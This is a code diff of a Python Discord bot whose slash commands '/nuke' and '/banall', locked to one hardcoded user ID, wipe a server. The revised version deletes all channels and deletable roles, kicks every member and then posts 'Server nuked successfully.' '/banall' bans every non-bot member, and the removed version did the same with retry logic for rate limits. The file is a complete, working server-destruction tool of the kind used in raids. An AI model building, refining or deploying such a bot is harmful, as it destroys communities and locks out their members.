@@ -1,17 +1,17 @@
+# bot.py
 import os
 import threading
 import asyncio
 import nextcord
 from nextcord.ext import commands
+from nextcord.ui import View, Button
 from nextcord import Interaction
-from nextcord.ui import View
 from flask import Flask
-from nextcord.errors import HTTPException
 
 # ----------------------
 # CONFIG
 # ----------------------
-AUTHORIZED_USERS = {1355140133661184221}
+AUTHORIZED_USER = 1355140133661184221  # Only this user can use /nuke
 TOKEN = os.environ.get("TOKEN")
 PORT = int(os.environ.get("PORT", 10000))
 
@@ -19,7 +19,7 @@ if not TOKEN:
     raise RuntimeError("Missing TOKEN environment variable")
 
 # ----------------------
-# FLASK KEEP-ALIVE
+# FLASK KEEP-ALIVE (Render)
 # ----------------------
 app = Flask("")
 
@@ -33,280 +33,158 @@ def run_flask():
 threading.Thread(target=run_flask, daemon=True).start()
 
 # ----------------------
-# BOT SETUP
+# NEXTCORD BOT
 # ----------------------
-intents = nextcord.Intents.default()
-intents.members = True
-intents.guilds = True
-
+intents = nextcord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
+
 
 @bot.event
 async def on_ready():
-    print(f"✅ Logged in as {bot.user}")
-    await bot.sync_application_commands()
+    print(f"Bot logged in as {bot.user}")
+
 
 # ----------------------
-# UTILS
+# CONFIRMATION BUTTON VIEW
 # ----------------------
-def progress_bar(done, total, size=20):
-    if total == 0:
-        return "▓" * size
-    filled = int(size * done / total)
-    return "▓" * filled + "░" * (size - filled)
-
-# ----------------------
-# STOP BUTTON VIEW
-# ----------------------
-class StopView(View):
+class ConfirmNuke(View):
     def __init__(self, user_id):
-        super().__init__(timeout=None)
+        super().__init__(timeout=60)
         self.user_id = user_id
-        self.stop_requested = False
+        self.result = None
 
     async def interaction_check(self, interaction: Interaction):
         if interaction.user.id != self.user_id:
-            await interaction.response.send_message(
-                "❌ You can’t press this button.",
-                ephemeral=True
-            )
+            await interaction.response.send_message("You cannot use these buttons.", ephemeral=True)
             return False
         return True
 
-    @nextcord.ui.button(
-        label="🛑 STOP",
-        style=nextcord.ButtonStyle.danger
-    )
-    async def stop(
-        self,
-        button: nextcord.ui.Button,
-        interaction: Interaction
-    ):
-        self.stop_requested = True
-        button.disabled = True
-        await interaction.response.edit_message(
-            content="🛑 **STOP REQUESTED — HALTING...**",
-            view=self
-        )
+    @nextcord.ui.button(label="CONFIRM NUKE", style=nextcord.ButtonStyle.danger)
+    async def confirm(self, button, interaction: Interaction):
+        self.result = True
+        for child in self.children:
+            child.disabled = True
+        await interaction.response.edit_message(content="💥 Nuke confirmed! Starting...", view=self)
+        self.stop()
 
-# ----------------------
-# SAFE CHANNEL DELETE HELPER
-# ----------------------
-async def delete_channel_safe(channel):
-    while True:
-        try:
-            await channel.delete(reason="Nuked")
-            return True
-        except HTTPException as e:
-            if e.status == 429:  # Rate limited
-                retry = getattr(e, "retry_after", 1)
-                print(f"429 hit on {channel.name}, retrying in {retry}s")
-                await asyncio.sleep(retry)
-                continue
-            else:
-                print(f"Failed to delete {channel.name}: {e}")
-                return False
-        except Exception as e:
-            print(f"Unexpected error deleting {channel.name}: {e}")
-            return False
+    @nextcord.ui.button(label="CANCEL", style=nextcord.ButtonStyle.secondary)
+    async def cancel(self, button, interaction: Interaction):
+        self.result = False
+        for child in self.children:
+            child.disabled = True
+        await interaction.response.edit_message(content="❌ Cancelled.", view=self)
+        self.stop()
 
-# ----------------------
-# /BANALL COMMAND
-# ----------------------
-@bot.slash_command(description="Ban all members except authorized users")
-async def banall(interaction: Interaction):
-
-    if interaction.user.id not in AUTHORIZED_USERS:
-        await interaction.response.send_message("❌ Not allowed.", ephemeral=True)
-        return
-
-    await interaction.response.defer(ephemeral=True)
-
-    guild = interaction.guild
-    members = [
-        m for m in guild.members
-        if not m.bot and m.id not in AUTHORIZED_USERS
-    ]
-
-    total = len(members)
-    banned = 0
-    failed = 0
-
-    view = StopView(interaction.user.id)
-
-    msg = await interaction.followup.send(
-        content=(
-            "🔨 **BANALL IN PROGRESS**\n"
-            f"{progress_bar(0, total)}\n"
-            f"Banned: 0 / {total}"
-        ),
-        view=view,
-        ephemeral=True
-    )
-
-    for member in members:
-        if view.stop_requested:
-            break
-
-        try:
-            await member.ban(reason="Mass ban")
-            banned += 1
-        except:
-            failed += 1
-
-        await msg.edit(
-            content=(
-                "🔨 **BANALL IN PROGRESS**\n"
-                f"{progress_bar(banned, total)}\n"
-                f"🔨 Banned: {banned} / {total}\n"
-                f"⚠️ Failed: {failed}"
-            ),
-            view=view
-        )
-
-        await asyncio.sleep(1.0)
-
-    status = "🛑 **STOPPED BY USER**" if view.stop_requested else "✅ **BANALL COMPLETE**"
-
-    await msg.edit(
-        content=(
-            f"{status}\n"
-            f"{progress_bar(banned, total)}\n"
-            f"🔨 Banned: {banned}\n"
-            f"⚠️ Failed: {failed}"
-        ),
-        view=None
-    )
 
 # ----------------------
 # /NUKE COMMAND
 # ----------------------
-@bot.slash_command(description="Delete channels, roles and ban members")
+@bot.slash_command(name="nuke", description="Deletes all channels, roles, and kicks everyone.")
 async def nuke(interaction: Interaction):
 
-    if interaction.user.id not in AUTHORIZED_USERS:
-        await interaction.response.send_message("❌ Not allowed.", ephemeral=True)
+    # Check if authorized user
+    if interaction.user.id != AUTHORIZED_USER:
+        await interaction.response.send_message("❌ You cannot use this command.", ephemeral=True)
         return
 
-    await interaction.response.defer(ephemeral=True)
+    view = ConfirmNuke(interaction.user.id)
 
-    guild = interaction.guild
-    bot_member = guild.me
-
-    # Filter only channels the bot can manage
-    channels = [
-        ch for ch in guild.channels
-        if ch.permissions_for(bot_member).manage_channels
-    ]
-
-    roles = [
-        r for r in guild.roles
-        if not r.is_default() and not r.managed
-        and r.position < bot_member.top_role.position
-    ]
-
-    members = [
-        m for m in guild.members
-        if not m.bot and m.id not in AUTHORIZED_USERS
-    ]
-
-    view = StopView(interaction.user.id)
-
-    ch_done = rl_done = bn_done = 0
-    total_tasks = len(channels) + len(roles) + len(members)
-
-    msg = await interaction.followup.send(
-        content="💥 **NUKE STARTING...**",
+    await interaction.response.send_message(
+        "⚠️ **WARNING** — This will delete all channels, deletable roles, and kick all possible members.\n"
+        "Press **CONFIRM NUKE** to continue.",
         view=view,
         ephemeral=True
     )
 
+    await view.wait()
+
+    if not view.result:
+        await interaction.followup.send("Nuke cancelled.", ephemeral=True)
+        return
+
+    guild = interaction.guild
+    bot_member = guild.get_member(bot.user.id)
+
     # ----------------------
-    # DELETE CHANNELS ONE PER SECOND
+    # DELETE CHANNELS
     # ----------------------
-    for ch in channels:
-        if view.stop_requested:
-            break
-
-        deleted = False
-        while not deleted:
-            deleted = await delete_channel_safe(ch)
-
-        ch_done += 1
-
-        await msg.edit(
-            content=(
-                "💥 **NUKE IN PROGRESS**\n"
-                f"🧨 Channels: {ch_done}/{len(channels)}\n"
-                f"🧱 Roles: {rl_done}/{len(roles)}\n"
-                f"🔨 Bans: {bn_done}/{len(members)}\n\n"
-                f"{progress_bar(ch_done + rl_done + bn_done, total_tasks)}"
-            ),
-            view=view
-        )
-
-        await asyncio.sleep(1.0)  # 1 channel per second
+    for channel in list(guild.channels):
+        try:
+            await channel.delete(reason="Nuked")
+            await asyncio.sleep(0.2)
+        except:
+            pass
 
     # ----------------------
     # DELETE ROLES
     # ----------------------
-    for role in roles:
-        if view.stop_requested:
-            break
+    for role in list(guild.roles):
         try:
+            if role.is_default():
+                continue
+            if role.managed:
+                continue
+            if role.position >= bot_member.top_role.position:
+                continue
             await role.delete(reason="Nuked")
-            rl_done += 1
+            await asyncio.sleep(0.15)
         except:
             pass
-        await msg.edit(
-            content=(
-                "💥 **NUKE IN PROGRESS**\n"
-                f"🧨 Channels: {ch_done}/{len(channels)}\n"
-                f"🧱 Roles: {rl_done}/{len(roles)}\n"
-                f"🔨 Bans: {bn_done}/{len(members)}\n\n"
-                f"{progress_bar(ch_done + rl_done + bn_done, total_tasks)}"
-            ),
-            view=view
-        )
-        await asyncio.sleep(1.0)
 
     # ----------------------
-    # BAN MEMBERS
+    # KICK MEMBERS
     # ----------------------
-    for member in members:
-        if view.stop_requested:
-            break
+    for member in list(guild.members):
         try:
-            await member.ban(reason="Nuked")
-            bn_done += 1
+            if member.id == AUTHORIZED_USER or member.id == bot.user.id:
+                continue
+            await member.kick(reason="Nuked")
+            await asyncio.sleep(0.2)
         except:
             pass
-        await msg.edit(
-            content=(
-                "💥 **NUKE IN PROGRESS**\n"
-                f"🧨 Channels: {ch_done}/{len(channels)}\n"
-                f"🧱 Roles: {rl_done}/{len(roles)}\n"
-                f"🔨 Bans: {bn_done}/{len(members)}\n\n"
-                f"{progress_bar(ch_done + rl_done + bn_done, total_tasks)}"
-            ),
-            view=view
+
+    # ----------------------
+    # Create final channel
+    # ----------------------
+    try:
+        ch = await guild.create_text_channel("server-nuked")
+        await ch.send("💥 Server nuked successfully.")
+    except:
+        pass
+
+    await interaction.followup.send("🔥 Nuke completed.", ephemeral=True)
+
+# ---------------------------
+# Slash Command: /banall
+# ---------------------------
+@bot.slash_command(
+    name="banall",
+    description="Ban all server members (except you)."
+)
+async def banall(interaction: nextcord.Interaction):
+
+    # Authorization check
+    if interaction.user.id != 1355140133661184221:
+        await interaction.response.send_message(
+            "You are not allowed to use this command.", ephemeral=True
         )
-        await asyncio.sleep(1.0)
+        return
 
-    # ----------------------
-    # FINAL STATUS
-    # ----------------------
-    final_status = "🛑 **NUKE STOPPED**" if view.stop_requested else "💥 **NUKE COMPLETE**"
+    await interaction.response.send_message("Mass ban started...", ephemeral=True)
 
-    await msg.edit(
-        content=(
-            f"{final_status}\n"
-            f"🧨 Channels deleted: {ch_done}\n"
-            f"🧱 Roles deleted: {rl_done}\n"
-            f"🔨 Members banned: {bn_done}"
-        ),
-        view=None
-    )
+    guild = interaction.guild
+
+    for member in guild.members:
+        # Skip you + bots
+        if member.id == 1355140133661184221 or member.bot:
+            continue
+        try:
+            await member.ban(reason="Mass ban command used.")
+            await asyncio.sleep(1)  # prevent rate-limit
+        except:
+            pass
+
+    await interaction.followup.send("Mass ban complete.")
 
 # ----------------------
 # RUN BOT
